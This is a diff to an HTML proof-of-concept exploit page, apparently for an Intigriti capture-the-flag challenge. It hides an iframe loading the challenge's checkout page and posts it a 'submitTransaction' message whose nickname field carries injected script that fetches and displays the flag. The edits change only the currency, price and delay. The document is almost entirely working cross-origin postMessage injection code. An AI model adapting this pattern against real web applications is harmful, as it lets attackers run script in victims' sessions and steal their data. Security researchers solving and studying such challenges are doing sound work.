@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <body>
-<iframe id="f" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1000000" style="display:none"></iframe>
+<iframe id="f" src="https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=45000" style="display:none"></iframe>
 <script>
 window.onload = () => {
     setTimeout(() => {
@@ -10,8 +10,8 @@ window.onload = () => {
             .then(r=>r.json())
             .then(d=>alert('FLAG: '+d.flag))
         ">`;
-        document.getElementById('f').contentWindow.postMessage({type:'submitTransaction',transaction:{toAddress:'deadbeef',currency:'1337COIN',amount:0.0001,nickname:p}},'*');
-    },2000);
+        document.getElementById('f').contentWindow.postMessage({type:'submitTransaction',transaction:{toAddress:'deadbeef',currency:'BTC',amount:0.0001,nickname:p}},'*');
+    },2500);
 };
 </script>
 </body>
